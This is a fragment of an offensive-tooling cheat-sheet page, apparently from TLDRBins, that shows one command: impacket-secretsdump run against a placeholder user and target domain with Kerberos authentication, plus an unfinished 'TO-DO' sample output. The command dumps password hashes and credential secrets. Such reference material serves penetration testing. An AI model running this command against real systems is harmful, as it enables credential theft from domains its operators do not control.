<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;TARGET_DOMAIN&gt;</span>' -k -no-pass
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div></div></div><p></p>

</div>
</main>
<script type="module" src="/js/main.js"></script>
<footer>
  <hr>
  <div> 2025 TLDRBins</div>
</footer>


</body></html>